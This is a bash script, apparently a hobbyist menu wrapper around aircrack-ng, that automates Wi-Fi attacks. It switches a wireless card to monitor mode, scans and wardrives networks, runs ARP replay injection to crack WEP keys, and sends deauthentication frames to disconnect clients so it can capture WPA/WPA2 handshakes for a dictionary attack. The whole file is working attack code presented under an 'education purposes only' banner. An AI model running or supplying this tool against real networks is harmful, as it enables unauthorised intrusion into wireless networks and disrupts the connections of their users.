#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Permission Denied. Run as root!"
  exit
fi
clear
echo "--------------------------------------------------------------"
echo "|                                                            |"
echo "|       Welcome to the Aircrack-ng Automation tool.          |"
echo "|                   Written by V0lp3                         |"
echo "|     This tool was written for education purposes only.     |"
echo "|    For more information visit https://www.aircrack-ng.org  |"
echo "|                                                            |"
echo "--------------------------------------------------------------"
sleep 3
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo "Preparing to input interface..."
echo ""
echo ""
echo ""
sleep 3
ifconfig
read -p "Input interface here: " interface
echo ""
echo "Placing interface into monitor mode..."
ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up
until [ "$selection_1" = "Exit" ]; do
echo "-----------------------"
echo "| Options:            |"
echo "| 1. Scan for Wifi    |"
echo "| 2. Wardriving       |"
echo "| 3. WEP Attack       |"
echo "| 4. WPA/WPA2 Attack  |"
echo "| Exit: Quit Program  |"
echo "-----------------------"
read -p "Please make your selection: " selection_1
if [ $selection_1 = "1" ];
then
  echo "Beginning Scan For Wifi Access Points..."
  echo "(Press Ctrl+C to return to Main Menu)"
  sleep 2
  airodump-ng $interface
fi
if [ $selection_1 = "2" ];
then
  read -p "Input desired file path (Defaults to current Directory): " wardrive_path
  read -p "Input filename to write to:" wardrive_file
  echo "Output will be written to $wardrive_path$wardrive_file.csv"
  sleep 1
  echo "(Press Ctrl+C to stop scanning)"
  sleep 2
  airodump-ng $interface  -w $wardrive_path$wardrive_file --write-interval 30 -o csv
fi
if [ $selection_1 = "3" ];
then
  read -p "Enter the BSSID of Target: " wep_bssid
  read -p "Enter the Channel of Target: " wep_channel
  echo "Running airodump to discover clients. Press Ctrl+C to continue."
  iwconfig $interface channel $wep_channel
  airodump-ng $interface --bssid $wep_bssid -c $wep_channel --ignore-negative-one
  read -p "Enter filename to write to: " wep_file
  read -p "Enter connected client BSSID (ARP Injection): " wep_client
  echo "Begining ARP Injection..."
  sleep 2
  aireplay-ng -3 -b $wep_bssid -c $wep_client $interface --ignore-negative-one &
  x-terminal-emulator -e airodump-ng --bssid $wep_bssid -c $wep_channel -w $wep_file $interface --ignore-negative-one
  clear
  echo "Capture Complete! Running Aircrack-ng."
  sleep 1
  wep_file="${wep_file}*.cap"
  aircrack-ng -z $wep_file
  wait
fi
if [ $selection_1 = "4" ];
then
  read -p "Enter the BSSID of Target: " wpa_bssid
  read -p "Enter the Channel of Target: " wpa_channel
  echo "Running airodump to discover clients. Press Ctrl+C to continue."
  airodump-ng $interface --bssid $wpa_bssid -c $wpa_channel --ignore-negative-one
  iwconfig $interface channel $wpa_channel
  read -p "Enter filename to write to: " wpa_file
  read -p "Enter connected client BSSID for DeAuth (No input will broadcast) (Example: -c 00:00:00:00:00:00): " wpa_client
  read -p "Enter number of DeAuths sent (Example: 25): " wpa_deauth
  echo "Please wait for all DeAuths to complete, then close secondary terminal to continue..."
  sleep 2
  aireplay-ng --deauth $wpa_deauth -a  $wpa_bssid $wpa_client $interface --ignore-negative-one &
  x-terminal-emulator -e airodump-ng --bssid $wpa_bssid -c $wpa_channel -w $wpa_file $interface --ignore-negative-one
  clear
  echo "Deauth complete! Will now attempt to crack handshake..."
  read -p "Enter the path to wordlist for dictionary attack (Example: /home/user/wordlist.dic): " wpa_worlist
  echo "Beginning Dictionary attack on Handshake..."
  wpa_file="${wpa_file}*.cap"
  aircrack-ng -w $wpa_worlist -b $wpa_bssid $wpa_file
  wait
fi
done
echo "Exiting Monitor Mode, one moment..."
ifconfig $interface down
iwconfig $interface mode managed
ifconfig $interface up
clear
